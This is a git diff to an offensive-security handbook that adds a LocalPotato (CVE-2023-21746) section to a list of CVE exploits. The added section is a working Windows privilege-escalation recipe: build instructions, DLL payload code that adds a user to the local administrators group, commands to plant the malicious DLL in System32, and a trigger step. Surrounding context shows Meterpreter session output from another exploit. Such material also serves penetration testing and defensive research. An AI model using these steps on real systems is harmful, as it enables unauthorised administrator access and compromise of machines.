@@ -7,6 +7,7 @@
 - [Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Path-Traversal-Zero-Day-in-Apache-HTTP-Server-CVE-2021-41773)
 - [Dirty Pipe (CVE-2022-0847)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Dirty-Pipe-CVE-2022-0847)
 - [Juicy Potato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#juicy-potato)
+- [LocalPotato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#local-potato)
 - [Log4j / Log4Shell (CVE-2021-44228)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Log4j--Log4Shell-CVE-2021-44228)
 - [MS-MSDT "Follina"](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#MS-MSDT-Follina)
 - [SharpEfsPotato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#SharpEfsPotato)
@@ -137,6 +138,62 @@ C:\> .\exploit.exe
 ```c
 [*] Sending stage (175174 bytes) to <RHOST>
 [*] Meterpreter session 1 opened (<LHOST>:<LPORT> -> <RHOST>:51990) at 2021-01-31 12:36:26 +0100
+```
+
+## LocalPotato (CVE-2023-21746)
+
+> https://github.com/decoder-it/LocalPotato
+
+> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc
+
+Modify the following file and build the solution.
+
+```c
+StorSvc\RpcClient\RpcClient\storsvc_c.c
+```
+
+```c
+#if defined(_M_AMD64)
+
+//#define WIN10
+//#define WIN11
+#define WIN2019
+//#define WIN2022
+```
+
+Modify the following file and build the solution.
+
+```c
+StorSvc\SprintCSP\SprintCSP\main.c
+```
+
+```c
+void DoStuff() {
+
+    // Replace all this code by your payload
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    PROCESS_INFORMATION pi;
+    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
+        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return;
+}
+```
+
+First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.
+
+```c
+C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
+C:\> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
+```
+
+At least trigger `StorSvc` via `RpcClient.exe`.
+
+```c
+C:\> RpcClient.exe
 ```
 
 ## Log4j / Log4Shell (CVE-2021-44228)
